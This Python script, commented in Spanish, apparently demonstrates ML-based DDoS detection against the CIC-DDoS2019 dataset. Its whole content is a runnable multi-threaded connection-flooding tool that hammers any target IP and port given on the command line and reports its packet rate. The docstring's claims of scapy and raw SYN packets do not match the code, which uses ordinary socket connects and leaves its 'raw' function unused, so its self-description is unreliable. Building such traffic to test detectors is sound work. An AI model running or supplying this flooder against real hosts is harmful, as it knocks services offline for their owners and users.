#!/usr/bin/env python3
"""
syn_flood.py — SYN Flood real con scapy para demostracion
===========================================================
Envia paquetes SYN sin completar el handshake TCP.
Genera patrones que el modelo ML del CIC-DDoS2019 reconoce como ataque.

Uso: python3 syn_flood.py [target_ip] [target_port] [hilos] [duracion]
"""
import sys
import time
import random
import threading
import socket

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
THREADS = int(sys.argv[3]) if len(sys.argv) > 3 else 50
DURATION = int(sys.argv[4]) if len(sys.argv) > 4 else 60

END_TIME = time.time() + DURATION
total_syn = 0
lock = threading.Lock()

def syn_flood():
    global total_syn
    while time.time() < END_TIME:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect_ex((TARGET, PORT))
            s.close()
            with lock:
                total_syn += 1
        except:
            pass
        time.sleep(0.001)

def raw_syn_flood():
    """SYN directo con raw socket (más agresivo)."""
    global total_syn
    while time.time() < END_TIME:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            # Solo SYN, no completar handshake
            s.connect((TARGET, PORT))
            # No enviar nada más - dejar la conexión colgada
            with lock:
                total_syn += 1
            s.close()
        except:
            pass

print(f"\033[1;31m")
print(f"  {'=' * 55}")
print(f"  SYN FLOOD — Demo DDoS Detection with ML")
print(f"  {'=' * 55}")
print(f"\033[0m")
print(f"  Target:    {TARGET}:{PORT}")
print(f"  Hilos:     {THREADS}")
print(f"  Duracion:  {DURATION}s")
print(f"  Tipo:      SYN Flood (TCP half-open)")
print()

threads = []
for i in range(THREADS):
    t = threading.Thread(target=syn_flood, daemon=True)
    t.start()
    threads.append(t)

start = time.time()
try:
    while time.time() - start < DURATION:
        elapsed = int(time.time() - start)
        with lock:
            current = total_syn
        rate = current // max(1, elapsed)
        sys.stdout.write(f"\r  [{elapsed:3}s] SYN sent: {current:6} | Rate: {rate:5} SYN/s")
        sys.stdout.flush()
        time.sleep(1)
except KeyboardInterrupt:
    pass

elapsed_total = int(time.time() - start)
print(f"\n\n  Finalizado.")
print(f"  Total SYN: {total_syn}")
print(f"  Rate:      {total_syn // max(1, elapsed_total)} SYN/s")
print()
